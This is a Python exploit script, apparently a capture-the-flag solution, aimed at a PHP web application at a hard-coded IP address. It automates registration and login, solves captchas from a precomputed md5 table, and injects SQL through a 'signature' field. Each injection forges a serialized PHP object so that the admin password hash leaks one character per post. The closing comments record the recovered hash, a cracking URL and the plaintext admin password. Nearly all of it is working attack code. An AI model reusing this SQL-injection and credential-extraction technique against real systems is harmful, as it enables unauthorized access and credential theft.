import re
import string
import random
import requests
import subprocess

_target = 'http://47.97.221.96:23333/index.php?action='

def get_creds():
    username = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
    password = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
    return username, password

def solve_code(html):
    code = re.search(r'Code\(substr\(md5\(\?\), 0, 5\) === ([0-9a-f]{5})\)', html).group(1)
    solution = subprocess.check_output(['grep', '^'+code, 'captchas.txt']).split()[2]
    return solution

def register(username, password):
    resp = sess.get(_target+'register')
    code = solve_code(resp.text)
    sess.post(_target+'register', data={'username':username,'password':password,'code':code})
    return True

def login(username, password):
    resp = sess.get(_target+'login')
    code = solve_code(resp.text)
    sess.post(_target+'login', data={'username':username,'password':password,'code':code})
    return True

def publish(sig, mood):
    return sess.post(_target+'publish', data={'signature':sig,'mood':mood})

sess = requests.Session()
username, password = get_creds()
print '[+] register({}, {})'.format(username, password)
register(username, password)
print '[+] login({}, {})'.format(username, password)
login(username, password)
print '[+] user session => ' + sess.cookies.get_dict()['PHPSESSID']

for i in range(1,33): # we know password is 32 chars (md5)
    mood = '(select concat(`O:4:\"Mood\":3:{{s:4:\"mood\";i:`,ord(substr(password,{},1)),`;s:2:\"ip\";s:14:\"80.212.199.161\";s:4:\"date\";i:1520664478;}}`) from ctf_users where is_admin=1 limit 1)'.format(i)
    payload = 'a`, {}); -- -'.format(mood)
    resp = publish(payload, '0')

resp = sess.get(_target+'index')
moods = re.findall(r'img/([0-9]+)\.gif', resp.text)[::-1] # last publish will be read first in the html
admin_hash = ''.join(map(lambda k: chr(int(k)), moods))

print '[+] admin hash => ' + admin_hash

# admin:2533f492a796a3227b0c6f91d102cc36
# http://47.52.137.90:20000/getmd5.php?md5=2533f492a796a3227b0c6f91d102cc36
# md(nu1ladmin) == 2533f492a796a3227b0c6f91d102cc36
# admin:nu1ladmin
